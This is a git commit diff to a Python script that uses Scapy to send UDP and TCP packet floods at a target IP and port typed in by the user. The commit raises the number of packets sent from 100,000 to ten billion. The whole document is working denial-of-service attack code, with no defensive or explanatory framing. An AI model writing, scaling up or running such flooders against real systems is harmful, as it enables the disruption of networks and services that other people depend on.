28dec3b0eaeda22536af727fb679a51c978bac6f
Tabish M <110502581+tahseerxd@users.noreply.github.com>
2023-03-05 00:22:11 +0500

    Update python.py

--- python.py
+++ python.py
@@ -4,13 +4,13 @@ def udp_flood(target_ip, target_port):
     src_port = RandShort()
     payload = "X" * 128
     packet = IP(dst=target_ip)/UDP(dport=target_port, sport=src_port)/payload
-    send(packet*100000, verbose=0)
+    send(packet*10000000000, verbose=0)
 
 def tcp_flood(target_ip, target_port):
     src_port = RandShort()
     payload = "X" * 128
     packet = IP(dst=target_ip)/TCP(dport=target_port, sport=src_port)/payload
-    send(packet*100000, verbose=0)
+    send(packet*10000000000, verbose=0)
 
 target_ip = input("Enter target IP address: ")
 target_port = int(input("Enter target port: "))
